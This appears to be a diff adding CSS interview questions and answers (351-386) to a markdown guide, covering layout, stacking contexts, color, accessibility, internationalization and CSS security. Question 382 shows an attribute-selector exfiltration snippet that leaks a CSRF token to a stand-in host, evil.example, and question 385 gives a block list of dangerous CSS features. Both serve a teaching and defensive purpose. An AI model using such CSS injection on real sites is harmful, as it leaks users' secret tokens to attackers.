+  - [351: What causes a flash of unstyled content (FOUC)?](#351-what-causes-a-flash-of-unstyled-content-fouc)
+  - [352: How does CSS ordering break when you code-split?](#352-how-does-css-ordering-break-when-you-code-split)
+  - [353: How do you stop CSS from leaking between micro-frontends?](#353-how-do-you-stop-css-from-leaking-between-micro-frontends)
+  - [354: A modal opens below the sticky header. Walk through how you'd fix it.](#354-a-modal-opens-below-the-sticky-header-walk-through-how-youd-fix-it)
+  - [355: What is the top layer and why does it help with `z-index` problems?](#355-what-is-the-top-layer-and-why-does-it-help-with-z-index-problems)
+  - [356: What makes an element the containing block for `position: fixed` children?](#356-what-makes-an-element-the-containing-block-for-position-fixed-children)
+  - [357: How are percentage heights worked out?](#357-how-are-percentage-heights-worked-out)
+  - [358: What is a min-content contribution, and why does it matter?](#358-what-is-a-min-content-contribution-and-why-does-it-matter)
+  - [359: Can you describe the flexbox sizing algorithm in simple steps?](#359-can-you-describe-the-flexbox-sizing-algorithm-in-simple-steps)
+  - [360: How does `min-width: auto` work for flex items exactly?](#360-how-does-min-width-auto-work-for-flex-items-exactly)
+  - [361: Can you describe how grid tracks are sized?](#361-can-you-describe-how-grid-tracks-are-sized)
+  - [362: How does `fr` share space when content is bigger than the share?](#362-how-does-fr-share-space-when-content-is-bigger-than-the-share)
+  - [363: What are some details of subgrid that people miss?](#363-what-are-some-details-of-subgrid-that-people-miss)
+  - [364: Is there a performance difference between grid and flexbox for large lists?](#364-is-there-a-performance-difference-between-grid-and-flexbox-for-large-lists)
+  - [365: What are the tricky margin collapsing cases?](#365-what-are-the-tricky-margin-collapsing-cases)
+  - [366: What is an inline formatting context and a line box?](#366-what-is-an-inline-formatting-context-and-a-line-box)
+  - [367: Why do inline-blocks with different content not line up at the top?](#367-why-do-inline-blocks-with-different-content-not-line-up-at-the-top)
+  - [368: What does `text-box` (`text-box-trim`) do?](#368-what-does-text-box-text-box-trim-do)
+  - [369: Why doesn't text look vertically centered even with flexbox?](#369-why-doesnt-text-look-vertically-centered-even-with-flexbox)
+  - [370: What happens with sub-pixel values?](#370-what-happens-with-sub-pixel-values)
+  - [371: How do you draw a true 1px hairline on high-DPI screens?](#371-how-do-you-draw-a-true-1px-hairline-on-high-dpi-screens)
+  - [372: Why does text look blurry after a transform?](#372-why-does-text-look-blurry-after-a-transform)
+  - [373: What was the `translateZ(0)` hack, and should you still use it?](#373-what-was-the-translatez0-hack-and-should-you-still-use-it)
+  - [374: What does `in oklch` mean in a gradient?](#374-what-does-in-oklch-mean-in-a-gradient)
+  - [375: What is gamut mapping?](#375-what-is-gamut-mapping)
+  - [376: How do you design for forced colors mode in depth?](#376-how-do-you-design-for-forced-colors-mode-in-depth)
+  - [377: What is the accessibility impact of different ways of hiding content?](#377-what-is-the-accessibility-impact-of-different-ways-of-hiding-content)
+  - [378: How can CSS help manage focus and keyboard use?](#378-how-can-css-help-manage-focus-and-keyboard-use)
+  - [379: How should view transitions handle reduced motion?](#379-how-should-view-transitions-handle-reduced-motion)
+  - [380: What should you watch for when supporting RTL at scale?](#380-what-should-you-watch-for-when-supporting-rtl-at-scale)
+  - [381: What CSS issues come up with internationalization beyond RTL?](#381-what-css-issues-come-up-with-internationalization-beyond-rtl)
+  - [382: How can CSS be used to steal data?](#382-how-can-css-be-used-to-steal-data)
+  - [383: How does Content Security Policy affect CSS?](#383-how-does-content-security-policy-affect-css)
+  - [384: What is clickjacking and how does CSS relate to it?](#384-what-is-clickjacking-and-how-does-css-relate-to-it)
+  - [385: How would you safely let users customise styles?](#385-how-would-you-safely-let-users-customise-styles)
+  - [386: Why are `:visited` styles limited?](#386-why-are-visited-styles-limited)
+  - [387: What are the risks of loading third-party CSS?](#387-what-are-the-risks-of-loading-third-party-css)
+  - [388: Why can't a container query check the container's own size, and why is `inline-size` the usual choice?](#388-why-cant-a-container-query-check-the-containers-own-size-and-why-is-inline-size-the-usual-choice)
+  - [389: How can you use style queries for component variants?](#389-how-can-you-use-style-queries-for-component-variants)
+  - [390: How do you use `:has()` for state-based styling, and what are the pitfalls?](#390-how-do-you-use-has-for-state-based-styling-and-what-are-the-pitfalls)
+  - [391: What is the specificity gotcha with native nesting?](#391-what-is-the-specificity-gotcha-with-native-nesting)
+  - [392: What are the pitfalls of where you put `&` in nested rules?](#392-what-are-the-pitfalls-of-where-you-put--in-nested-rules)
+  - [393: How do `@import` with `layer()`, `supports()` and media conditions work together?](#393-how-do-import-with-layer-supports-and-media-conditions-work-together)
+  - [394: How do you share breakpoints between CSS and JavaScript?](#394-how-do-you-share-breakpoints-between-css-and-javascript)
+  - [395: When do you use `matchMedia`, `ResizeObserver` or container queries?](#395-when-do-you-use-matchmedia-resizeobserver-or-container-queries)
+  - [396: How do CSS animations compare to JavaScript animations?](#396-how-do-css-animations-compare-to-javascript-animations)
+  - [397: What does `animation-composition` do?](#397-what-does-animation-composition-do)
+  - [398: What is a CSS motion path?](#398-what-is-a-css-motion-path)
+  - [399: What are scroll-state container queries?](#399-what-are-scroll-state-container-queries)
+  - [400: What is scroll anchoring?](#400-what-is-scroll-anchoring)
+  - [401: How do you keep a large CSS codebase maintainable?](#401-how-do-you-keep-a-large-css-codebase-maintainable)
+  - [402: How should a component library write its CSS so apps can customise it?](#402-how-should-a-component-library-write-its-css-so-apps-can-customise-it)
+  - [403: How do you build a fluid spacing and type scale?](#403-how-do-you-build-a-fluid-spacing-and-type-scale)
+  - [404: When do you choose CSS backgrounds versus `<img>`/`<picture>` for responsive images?](#404-when-do-you-choose-css-backgrounds-versus-imgpicture-for-responsive-images)
+  - [405: What advanced print features does CSS have?](#405-what-advanced-print-features-does-css-have)
+  - [406: Why is CSS for emails different?](#406-why-is-css-for-emails-different)
+  - [407: How do you decide which browsers to support?](#407-how-do-you-decide-which-browsers-to-support)
+  - [408: Why are CSS polyfills hard to write?](#408-why-are-css-polyfills-hard-to-write)
+  - [409: How do you detect CSS support from JavaScript?](#409-how-do-you-detect-css-support-from-javascript)
+  - [410: What does `@supports selector()` let you do?](#410-what-does-supports-selector-let-you-do)
+  - [411: A page has a horizontal scrollbar on mobile. How do you find the cause?](#411-a-page-has-a-horizontal-scrollbar-on-mobile-how-do-you-find-the-cause)
+  - [412: Why does a `100vh` section cut off content on mobile, and how do you fix it?](#412-why-does-a-100vh-section-cut-off-content-on-mobile-and-how-do-you-fix-it)
+  - [413: How do you handle hover styles that "stick" on touch devices?](#413-how-do-you-handle-hover-styles-that-stick-on-touch-devices)
+  - [414: How do you lock page scroll when a modal is open without layout shift?](#414-how-do-you-lock-page-scroll-when-a-modal-is-open-without-layout-shift)
+  - [415: Animations stutter on cheap Android phones. How do you investigate?](#415-animations-stutter-on-cheap-android-phones-how-do-you-investigate)
+  - [416: After adding `:has()` selectors, style recalculation got slow. What do you do?](#416-after-adding-has-selectors-style-recalculation-got-slow-what-do-you-do)
+  - [417: A third-party widget is breaking your styles, or your styles are breaking it. What are your options?](#417-a-third-party-widget-is-breaking-your-styles-or-your-styles-are-breaking-it-what-are-your-options)
+  - [418: How do you handle images and shadows in dark mode?](#418-how-do-you-handle-images-and-shadows-in-dark-mode)
+  - [419: How do you make cards in a row line up their titles, text and buttons?](#419-how-do-you-make-cards-in-a-row-line-up-their-titles-text-and-buttons)
+  - [420: How do you make a data table work on small screens?](#420-how-do-you-make-a-data-table-work-on-small-screens)
+  - [421: A layout with a sidebar breaks when the sidebar content is wide. How do you fix it?](#421-a-layout-with-a-sidebar-breaks-when-the-sidebar-content-is-wide-how-do-you-fix-it)
+  - [422: A dropdown inside an `overflow: hidden` card gets cut off. How do you fix it?](#422-a-dropdown-inside-an-overflow-hidden-card-gets-cut-off-how-do-you-fix-it)
+  - [423: How do you align icons with text?](#423-how-do-you-align-icons-with-text)
+  - [424: What are the `lh`, `rlh`, `cap` and `ic` units?](#424-what-are-the-lh-rlh-cap-and-ic-units)
+  - [425: How do viewport units behave with scrollbars and the on-screen keyboard?](#425-how-do-viewport-units-behave-with-scrollbars-and-the-on-screen-keyboard)
+  - [426: What does the CSS `zoom` property do now?](#426-what-does-the-css-zoom-property-do-now)
+  - [427: How do you choose between cascade layers, `@scope` and CSS Modules?](#427-how-do-you-choose-between-cascade-layers-scope-and-css-modules)
+  - [428: How would you migrate a large Sass codebase to modern CSS?](#428-how-would-you-migrate-a-large-sass-codebase-to-modern-css)
+  - [429: What do you look for when reviewing a CSS pull request?](#429-what-do-you-look-for-when-reviewing-a-css-pull-request)
+  - [430: How do you measure CSS performance?](#430-how-do-you-measure-css-performance)
+  - [431: How can CSS affect Interaction to Next Paint (INP)?](#431-how-can-css-affect-interaction-to-next-paint-inp)
+  - [432: What is the `shape()` function?](#432-what-is-the-shape-function)
+  - [433: What is the difference between computed, used and resolved values?](#433-what-is-the-difference-between-computed-used-and-resolved-values)
+  - [434: Why does inheritance use the computed value, and when does that cause bugs?](#434-why-does-inheritance-use-the-computed-value-and-when-does-that-cause-bugs)
+  - [435: How does a CSS-only toggle (checkbox hack) compare to modern options?](#435-how-does-a-css-only-toggle-checkbox-hack-compare-to-modern-options)
+  - [436: How do you build a sticky element that changes appearance when it gets stuck?](#436-how-do-you-build-a-sticky-element-that-changes-appearance-when-it-gets-stuck)
+  - [437: How do `transition` and `@starting-style` handle elements added to the DOM?](#437-how-do-transition-and-starting-style-handle-elements-added-to-the-dom)
+  - [438: How do you stagger an animation over a list in CSS?](#438-how-do-you-stagger-an-animation-over-a-list-in-css)
+  - [439: What are `:open`, `:popover-open` and `:modal`?](#439-what-are-open-popover-open-and-modal)
+  - [440: What is the `reading-flow` property?](#440-what-is-the-reading-flow-property)
+  - [441: How does `color-scheme` affect elements and iframes?](#441-how-does-color-scheme-affect-elements-and-iframes)
+  - [442: Why do layout bugs sometimes only appear after fonts load?](#442-why-do-layout-bugs-sometimes-only-appear-after-fonts-load)
+  - [443: What's the difference between hiding content with `content-visibility: hidden` and `display: none`?](#443-whats-the-difference-between-hiding-content-with-content-visibility-hidden-and-display-none)
+  - [444: How do you keep visual order and DOM order in sync in responsive layouts?](#444-how-do-you-keep-visual-order-and-dom-order-in-sync-in-responsive-layouts)
+  - [445: How would you build a pure CSS carousel with good accessibility?](#445-how-would-you-build-a-pure-css-carousel-with-good-accessibility)
+  - [446: How do you check color contrast, and what are the rules?](#446-how-do-you-check-color-contrast-and-what-are-the-rules)
+  - [447: What should you know about CSS `transition` on custom properties?](#447-what-should-you-know-about-css-transition-on-custom-properties)
+  - [448: How do you write CSS for very large DOMs (for example a spreadsheet or log viewer)?](#448-how-do-you-write-css-for-very-large-doms-for-example-a-spreadsheet-or-log-viewer)
+  - [449: What happens from downloading a CSS file to pixels on screen?](#449-what-happens-from-downloading-a-css-file-to-pixels-on-screen)
+  - [450: When should you not solve something with CSS?](#450-when-should-you-not-solve-something-with-css)
+
 ## Easy Questions (1-150)
 
 ### 1: What is CSS?
@@ -4301,7 +4755,7 @@ If the positioned element would overflow the viewport, the browser can try other
 }
 ```
 
-The popover handles showing and hiding, the top layer, light dismiss (closing on outside click or Escape) and keyboard support. Anchor positioning places it. `popover="hint"` (newer, Chromium) lets a hint open without closing other open popovers. In browsers where the popover invoker is the anchor, newer Chromium sets an implicit anchor, so you may not need `anchor-name` at all.
+The popover handles showing and hiding, the top layer, light dismiss (closing on outside click or Escape) and keyboard support. Anchor positioning places it. `popover="hint"` (newer, Chromium) lets a hint open without closing other open popovers. Newer Chromium versions also treat the button that opened a popover as its implicit anchor, so there you may not need `anchor-name` at all.
 
 ### 329: What is the customizable `<select>`?
 
@@ -4622,4 +5076,1264 @@ The server doesn't know the user's saved theme (it's in `localStorage`), so the 
 
 3. Use `color-scheme` and `light-dark()` so the default follows the OS with no JavaScript.
 4. In React, add `suppressHydrationWarning` on `<html>` because the attribute differs between server and client.
+
+### 351: What causes a flash of unstyled content (FOUC)?
+
+FOUC happens when HTML is painted before the CSS that styles it has loaded. Common causes:
+
+- CSS loaded with JavaScript (runtime CSS-in-JS, or injecting styles after hydration).
+- Stylesheets placed at the end of `<body>`, or loaded asynchronously without critical CSS.
+- Code-split CSS chunks that load after the JS chunk that renders the component.
+- Web components that render before their styles are attached.
+- Server-rendered HTML whose CSS isn't included in the response.
+
+Fixes: put critical CSS in `<link>` tags in `<head>`, extract CSS at build time, and make sure frameworks collect and emit the styles for each route during server rendering.
+
+### 352: How does CSS ordering break when you code-split?
+
+With code splitting, CSS for each chunk loads when the chunk loads. The order of the CSS in the document now depends on navigation order, not on source order. If two chunks have rules with the same specificity for the same element, the winner can change depending on which page the user visited first.
+
+Fixes:
+
+- Avoid same-specificity conflicts between modules. Each component should only style its own classes.
+- Use cascade layers, so the order of layers decides priority and load order doesn't matter.
+- Keep global or base CSS in one entry chunk that always loads first.
+
+### 353: How do you stop CSS from leaking between micro-frontends?
+
+Each micro-frontend is built by a different team, so global selectors and different versions of the same library can clash.
+
+- **Scope everything**: CSS Modules, prefixed class names (`.checkout-*`), or `@scope`.
+- **Shadow DOM**: wrap each micro-frontend in a custom element with its own shadow root for real isolation.
+- **Cascade layers per team**: the shell declares the layer order and each app puts its CSS in its own layer.
+- **No global resets** inside micro-frontends. Only the shell owns the reset and the base styles.
+- **Share design tokens** as custom properties from the shell, so the apps look the same without sharing CSS files.
+
+### 354: A modal opens below the sticky header. Walk through how you'd fix it.
+
+1. Check where the modal lives in the DOM. If it's inside a component tree with `transform`, `filter`, `isolation`, or a `z-index` + `position` ancestor, it's trapped in that ancestor's stacking context.
+2. Compare the stacking contexts. If the header has `z-index: 100` at the root level and the modal's ancestor has `z-index: 1`, the modal can't go above the header, whatever its own `z-index` is.
+3. Options, from best to worst:
+   - Use `<dialog>` with `showModal()`, which puts it in the top layer above everything.
+   - Render the modal in a portal at the end of `body`.
+   - Remove the property that creates the extra stacking context, or raise that ancestor's `z-index`.
+
+### 355: What is the top layer and why does it help with `z-index` problems?
+
+The top layer is a special rendering layer above the whole document. Elements in it aren't affected by ancestors' `z-index`, `overflow` or stacking contexts. Elements get there through:
+
+- `dialog.showModal()`
+- The `popover` attribute when shown
+- The Fullscreen API
+
+Within the top layer, the most recently added element is on top. You can't add an element to it with CSS alone, and `z-index` has no effect there. That makes dropdowns inside `overflow: hidden` containers and modals inside transformed parents simple to handle.
+
+### 356: What makes an element the containing block for `position: fixed` children?
+
+An ancestor becomes the containing block for fixed descendants (instead of the viewport) if it has:
+
+- `transform`, `translate`, `rotate`, `scale` or `perspective` other than `none`
+- `filter` or `backdrop-filter` other than `none`
+- `contain: layout`, `paint`, `strict` or `content`
+- `container-type` other than `normal`
+- `will-change` naming any of the above
+- `content-visibility: auto`
+
+This catches people out when a parent gets `backdrop-filter` for a glass effect and a fixed child inside suddenly moves with it. Moving the fixed element out of the ancestor, or using the top layer, fixes it.
+
+### 357: How are percentage heights worked out?
+
+A percentage `height` is based on the containing block's height, but only if that height is **definite**. A height is definite if:
+
+- It's set to a length, or a percentage of a definite height.
+- The element is absolutely positioned with both `top` and `bottom` set.
+- It's a stretched flex item in a container with a definite height.
+- It's a grid item, whose track size counts as definite.
+
+If the height isn't definite, the percentage acts like `auto`. This is why `height: 100%` works inside grid cells but not inside a normal `div` with `height: auto`. The `min-height` of the parent doesn't make its height definite, which is a common gotcha.
+
+### 358: What is a min-content contribution, and why does it matter?
+
+Every box has a **min-content contribution**: the smallest size it can be without overflowing, counting its margins, borders and padding. Flex and grid use these values to decide how small items can go.
+
+A single long word, a large image, a `<pre>` block or a table with a set width makes the min-content contribution big. A grid track with an `auto` minimum, or a flex item with `min-width: auto`, then refuses to shrink below it. That's what causes the "my 1fr column is wider than the others" and "my flex child overflows" bugs. The fixes are `minmax(0, 1fr)`, `min-width: 0` and `overflow-wrap: anywhere`.
+
+### 359: Can you describe the flexbox sizing algorithm in simple steps?
+
+1. Work out each item's **flex base size** from `flex-basis` (or `width`/`height` if the basis is `auto`, or the content size if both are `auto`).
+2. Collect items into lines (one line, or several if `flex-wrap` is on).
+3. For each line, compare the total base sizes to the container size, which gives free space (positive or negative).
+4. If there's positive space, share it by `flex-grow`. If negative, shrink by `flex-shrink × base size`.
+5. Clamp each item to its `min-*` and `max-*` sizes. If an item is clamped, freeze it and share the remaining space again among the other items.
+6. Work out cross sizes, then apply `justify-content`, `align-items`, `align-self` and auto margins.
+
+### 360: How does `min-width: auto` work for flex items exactly?
+
+For a flex item that isn't a scroll container (`overflow: visible`), `min-width: auto` (in a row) works out to the smaller of:
+
+- the content-based minimum (min-content size), and
+- the set `width` or `flex-basis`, if it has one (and the item's aspect ratio, for replaced elements).
+
+So a flex item won't shrink below its content even if `flex-shrink: 1` and the content overflows. When the item is a scroll container (`overflow: hidden` or `auto`), the automatic minimum becomes 0. That's why setting `overflow: hidden` also "fixes" the problem.
+
+### 361: Can you describe how grid tracks are sized?
+
+In simple terms:
+
+1. Fixed tracks (`200px`) get their size.
+2. For tracks with intrinsic sizes (`auto`, `min-content`, `max-content`, and the `auto` minimum of `1fr`), the browser looks at the items in each track and grows the track to fit their contributions. Items that span one track are handled first, then items that span more tracks.
+3. Any space left is used to grow tracks up to their maximums.
+4. `fr` tracks share what's left in proportion to their flex factors. A track never gets less than its base size from step 2.
+5. Finally, `auto` tracks are stretched if `justify-content`/`align-content` is `normal` or `stretch`.
+
+Spanning items over `fr` tracks and the `auto` minimums are where most surprises come from.
+
+### 362: How does `fr` share space when content is bigger than the share?
+
+`1fr` is `minmax(auto, 1fr)`. If one column's content needs 400px and the others need 50px in a 600px container with `1fr 1fr 1fr`, the browser can't give each 200px. The first column keeps its 400px minimum, and the other two share the rest (100px each).
+
+With `minmax(0, 1fr)`, all three columns are 200px each, and the content in the first one overflows or wraps. Choose based on what should give way: the layout or the content.
+
+### 363: What are some details of subgrid that people miss?
+
+- A subgrid uses the parent's tracks in the subgridded axis, so its items line up with items in sibling subgrids.
+- It inherits the parent's `gap`, but can set its own, which is applied by shrinking the inner items, not the tracks.
+- Line names from the parent come down. The subgrid can add its own: `grid-template-columns: subgrid [a] [b]`.
+- It must span the tracks it wants to use: `grid-row: span 3; grid-template-rows: subgrid;`.
+- An implicit grid isn't created in a subgridded axis. Extra items are placed in the last track.
+- Subgrid content takes part in the parent's track sizing, so a tall title in one card makes the title row taller in all cards. That's usually the point.
+
+### 364: Is there a performance difference between grid and flexbox for large lists?
+
+For normal page sizes, no. For very large layouts (thousands of items), grid track sizing that depends on content (`auto`, `max-content`, `auto-fill` with `minmax`) can be more expensive. Every item can affect every track, so the browser has to measure everything. Flexbox with fixed `flex-basis`, or grid with fixed tracks, is cheaper.
+
+For long lists the real answer is virtualization (rendering only the visible items) or `content-visibility: auto`, not picking between grid and flex.
+
+### 365: What are the tricky margin collapsing cases?
+
+- **Parent and first/last child**: a child's top margin escapes through the parent if the parent has no top border, padding, inline content or BFC. The parent seems to have the margin.
+- **Empty blocks**: an element with no height, padding, border or content has its own top and bottom margins collapse into one.
+- **Negative margins**: the result is the largest positive margin plus the most negative margin. `30px` and `-10px` give `20px`.
+- **Several margins**: three or more margins that touch all collapse together.
+- **No collapse** for flex and grid items, floats, absolutely positioned elements, inline-blocks, or across a BFC boundary.
+
+### 366: What is an inline formatting context and a line box?
+
+Inside a block, inline content (text, inline elements, inline-blocks) is laid out in **line boxes**, one per line. A line box's height is set by the tallest inline box on that line, after `vertical-align`. There's also an invisible "strut" with the parent's font and `line-height`, which is why an empty line or a lone image still takes up a full line of height.
+
+This explains several bugs: the gap under images, inline-blocks of different heights lining up oddly, and a small icon making a line taller than expected.
+
+### 367: Why do inline-blocks with different content not line up at the top?
+
+Inline-blocks line up on their **baseline**, which is the baseline of their last line of text. An inline-block with no in-flow line boxes, or with `overflow` other than `visible`, uses its bottom margin edge as its baseline instead. Boxes with different amounts of text, or one with `overflow: hidden`, end up at different heights.
+
+Fix it with `vertical-align: top` on the inline-blocks, or better, switch to flexbox or grid.
+
+### 368: What does `text-box` (`text-box-trim`) do?
+
+Fonts add extra space above capital letters and below the baseline, so text inside a button never looks quite centered, and spacing between headings and boxes looks uneven. `text-box` trims that space to the actual letter edges.
+
+```css
+.button, h1 {
+  text-box: trim-both cap alphabetic;
+}
+```
+
+`trim-both` trims the top and the bottom. `cap alphabetic` means trim to the top of capital letters and to the alphabetic baseline. It's in Chromium and Safari. Firefox doesn't have it yet, so unsupported browsers just keep the default spacing.
+
+### 369: Why doesn't text look vertically centered even with flexbox?
+
+Flexbox centers the **line box**, not the visible letters. Font metrics (ascent and descent) add different amounts of space above and below the glyphs, and every font is different. In a button, text often looks a pixel or two too high or too low.
+
+Fixes: `text-box: trim-both cap alphabetic` where it's supported, tweaking padding by hand for the specific font, or tools like Capsize that work out the trim from font metrics.
+
+### 370: What happens with sub-pixel values?
+
+Layout uses fractional values (like `33.333px`), but the final pixels on screen are whole device pixels. Browsers snap borders and edges to pixels in different ways, which can cause:
+
+- 1px gaps or overlaps between items in percentage layouts.
+- Blurry text or borders when an element sits at a half-pixel position after `translate(-50%, -50%)`.
+- Lines that look 1px thick in one place and 2px in another.
+
+Fixes: use grid or flex `gap` instead of percentage widths, avoid centering with `translate` when you can, and use `round()` to snap values to whole pixels.
+
+### 371: How do you draw a true 1px hairline on high-DPI screens?
+
+`1px` in CSS is several device pixels on a retina screen. For a single-device-pixel line:
+
+```css
+.hairline { border-bottom: 1px solid #ddd; }
+
+@media (min-resolution: 2dppx) {
+  .hairline { border-bottom-width: 0.5px; }
+}
+```
+
+Safari and Chromium draw `0.5px` borders on 2x screens. Another option is a `::after` element scaled with `scale: 1 0.5`. Ask whether it's needed: most designs look fine with a lighter color at 1px.
+
+### 372: Why does text look blurry after a transform?
+
+When an element is moved by a fractional amount, or scaled, the browser may rasterize it as a bitmap layer and then move the bitmap. Text in that layer can look soft:
+
+- `translate(-50%, -50%)` on an element with an odd width puts it at a half pixel.
+- `scale()` animations: the layer is drawn at one size and scaled on the GPU.
+- `will-change: transform` can keep a layer at a fixed raster scale.
+
+Fixes: avoid half-pixel offsets (use `inset: 0; margin: auto`, or grid centering), remove `will-change` after animations, and let the element settle at `transform: none` at the end.
+
+### 373: What was the `translateZ(0)` hack, and should you still use it?
+
+`transform: translateZ(0)` or `backface-visibility: hidden` was used to force an element onto its own GPU layer. People did it to smooth animations or fix flickering, mostly in old WebKit.
+
+Today it's legacy. Use `will-change: transform` if you really need early promotion, and only for elements that will animate. Forcing layers everywhere wastes memory and can also blur text and create unwanted stacking contexts.
+
+### 374: What does `in oklch` mean in a gradient?
+
+Gradients and `color-mix()` blend colors in a color space. The default for gradients is sRGB, which can make a muddy gray band in the middle, for example between blue and yellow. You can choose another space:
+
+```css
+.a { background: linear-gradient(in oklch, blue, yellow); }
+.b { background: linear-gradient(in oklch longer hue, red, red); } /* rainbow */
+.c { background: linear-gradient(in srgb-linear, black, white); }
+```
+
+`oklab` and `oklch` give smooth and bright blends. The hue options (`shorter`, `longer`, `increasing`, `decreasing`) set which way around the color wheel the hue goes.
+
+### 375: What is gamut mapping?
+
+When you use a color the screen can't show, like a very bright `oklch` color or a P3 color on an sRGB monitor, the browser has to map it to the closest color it can show. The spec says to keep lightness and hue and reduce chroma until the color fits, so it looks "less saturated but the same color". Older approaches simply clipped each RGB channel, which can change the hue.
+
+For designers, this means you can write wide-gamut colors and trust that older screens get something reasonable. Still check important brand colors on an sRGB screen.
+
+### 376: How do you design for forced colors mode in depth?
+
+In forced colors mode, the browser replaces colors with **system colors**: `Canvas`, `CanvasText`, `LinkText`, `ButtonFace`, `ButtonText`, `Highlight`, `HighlightText`, `GrayText`, and others.
+
+```css
+@media (forced-colors: active) {
+  .card { border: 1px solid CanvasText; }       /* keep edges */
+  .badge { forced-color-adjust: none; }          /* keep brand color, check contrast yourself */
+  .icon { fill: CanvasText; }                    /* SVG that uses fixed colors */
+  .button:focus-visible { outline: 2px solid Highlight; }
+  .selected { background: Highlight; color: HighlightText; }
+}
+```
+
+Things to know: `box-shadow` and background images that carry meaning are removed, `transparent` borders become visible (a trick for adding edges only in this mode), and `forced-color-adjust: none` opts an element out. Use that rarely.
+
+### 377: What is the accessibility impact of different ways of hiding content?
+
+| Method | Visible | In accessibility tree | Focusable |
+|---|---|---|---|
+| `display: none` / `hidden` attribute | No | No | No |
+| `visibility: hidden` | No | No | No |
+| `.sr-only` (clip pattern) | No | Yes | Yes |
+| `opacity: 0` | No | Yes | Yes |
+| `inert` attribute | Yes | No | No |
+| `content-visibility: hidden` | No | No | No |
+| `content-visibility: auto` (off-screen) | Skipped for render | Yes | Yes |
+
+A common bug is `opacity: 0` on closed menus. Screen reader and keyboard users can still reach invisible links. Pair it with `visibility: hidden` (which can be transitioned) or use `inert`.
+
+### 378: How can CSS help manage focus and keyboard use?
+
+- `:focus-visible` for keyboard-only focus rings.
+- `:has(:focus-visible)` to highlight a whole card when the link inside it is focused.
+- `scroll-margin` so focused elements aren't hidden under sticky headers.
+- `inert` (an HTML attribute) for background content when a custom modal is open. CSS can style `[inert]`.
+- Avoid `order`, `flex-direction: row-reverse` and `grid-auto-flow: dense` when they would make the visual order differ from the focus order. The `reading-flow` property (Chromium) is a newer fix that makes focus order follow the visual flex or grid order.
+
+```css
+.card:has(a:focus-visible) {
+  outline: 3px solid #4f46e5;
+  outline-offset: 4px;
+}
+```
+
+### 379: How should view transitions handle reduced motion?
+
+The default crossfade is usually fine, but slide and zoom transitions should be toned down:
+
+```css
+@media (prefers-reduced-motion: reduce) {
+  ::view-transition-group(*),
+  ::view-transition-old(*),
+  ::view-transition-new(*) {
+    animation-duration: 0s !important;
+  }
+}
+```
+
+Or skip the transition in JavaScript:
+
+```js
+const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
+if (!document.startViewTransition || reduce) update();
+else document.startViewTransition(update);
+```
+
+Scroll-driven animations need the same treatment, because motion tied to scrolling can be especially uncomfortable.
+
+### 380: What should you watch for when supporting RTL at scale?
+
+- Use logical properties everywhere (`margin-inline-start`, `inset-inline-end`, `text-align: start`). Lint for physical properties with Stylelint plugins.
+- Directional icons (arrows, chevrons, "back") need mirroring with `:dir(rtl)` and `scale: -1 1`. Non-directional icons (checkmarks, logos, media "play") must not be mirrored.
+- `transform: translateX()` and `background-position` aren't logical. Handle them on purpose.
+- Mixed content (an English product name in Arabic text) may need `unicode-bidi: isolate` or `<bdi>`.
+- Set `dir` on `<html>` (and on user-generated content with `dir="auto"`), not only in CSS. Screen readers and form fields use it.
+
+### 381: What CSS issues come up with internationalization beyond RTL?
+
+- **Text length**: German or Finnish can be 30-40% longer than English. Avoid fixed widths on buttons and tabs, and test with long strings.
+- **Line breaking**: Chinese and Japanese text breaks between almost any characters. `word-break: keep-all` keeps Korean words together. `line-break: strict` controls breaking near punctuation.
+- **Fonts**: CJK fonts are huge, so use system fonts or `unicode-range` subsets. Make sure `lang` is set so the browser picks the right glyphs (Japanese and Chinese share code points but differ in shape).
+- **Vertical text**: `writing-mode: vertical-rl` for Japanese or Chinese layouts, with logical properties.
+- **`text-transform: uppercase`** works differently by language (Turkish dotted i). It depends on `lang`.
+- **Quotes**: `quotes: auto` uses the right quote marks for `lang`.
+
+### 382: How can CSS be used to steal data?
+
+If an attacker can inject CSS (but not JavaScript) into a page, they can still leak data with attribute selectors and background requests:
+
+```css
+input[name="csrf"][value^="a"] { background: url("https://evil.example/?c=a"); }
+input[name="csrf"][value^="b"] { background: url("https://evil.example/?c=b"); }
+/* ...one rule per character, repeated for each position */
+```
+
+When a rule matches, the browser loads the URL and tells the attacker one character. With `@import` chains or many requests, they can rebuild tokens character by character. Similar tricks use `@font-face` with `unicode-range` to detect which characters are on the page.
+
+Defense: never allow user-controlled CSS without strict sanitization, use a CSP with `img-src`/`font-src`/`style-src` limits, and don't put secrets in attributes that CSS can read.
+
+### 383: How does Content Security Policy affect CSS?
+
+`style-src` controls which stylesheets and inline styles are allowed:
+
+- Without `'unsafe-inline'`, `<style>` blocks and `style=""` attributes are blocked, unless the `<style>` has a matching `nonce` or hash.
+- `style-src-elem` and `style-src-attr` let you set rules for `<style>`/`<link>` and `style` attributes separately.
+- Setting styles from JavaScript through the CSSOM (`el.style.color = "red"`) is **not** blocked, only `setAttribute("style", ...)` is.
+
+```http
+Content-Security-Policy: style-src 'self' 'nonce-r4nd0m'; style-src-attr 'none'
+```
+
+Runtime CSS-in-JS libraries that inject `<style>` tags need nonce support configured, which is another reason teams move to static CSS.
+
+### 384: What is clickjacking and how does CSS relate to it?
+
+Clickjacking loads your site in a hidden or transparent iframe (with `opacity: 0` and `z-index` tricks) on top of an attacker's page, so users click your buttons without knowing. CSS is the attacker's tool here. The defense is on your server: send `Content-Security-Policy: frame-ancestors 'self'` (or `X-Frame-Options: DENY`) so other sites can't frame your page.
+
+Inside your own site, watch for user-controlled styles that could place a transparent element over a "Delete" or "Pay" button.
+
+### 385: How would you safely let users customise styles?
+
+Don't accept raw CSS. Instead:
+
+- Offer a limited set of options (theme colors, fonts, sizes) and write them as custom properties after validating each value against a strict pattern:
+
+```js
+const isHex = /^#[0-9a-f]{6}$/i.test(input);
+if (isHex) container.style.setProperty("--user-accent", input);
+```
+
+- If you must allow CSS (a site builder, for example), parse it with a real CSS parser and allowlist properties. Block `url()`, `@import`, `expression()`, `behavior` and `-moz-binding` (old browsers), and selectors that match things outside the user's area.
+- Put user styles in a sandboxed iframe or shadow root, with a CSP that blocks outgoing requests.
+
+### 386: Why are `:visited` styles limited?
+
+`:visited` could show which sites a user has been to: a script could check the computed color of links to see if they were visited. To stop this, browsers:
+
+- Only allow a few properties in `:visited` (`color`, `background-color`, `border-color`, `outline-color`, `column-rule-color`, `fill`, `stroke`, text decoration color).
+- Return the unvisited value from `getComputedStyle`.
+- Don't let `:visited` affect layout, transparency or background images.
+
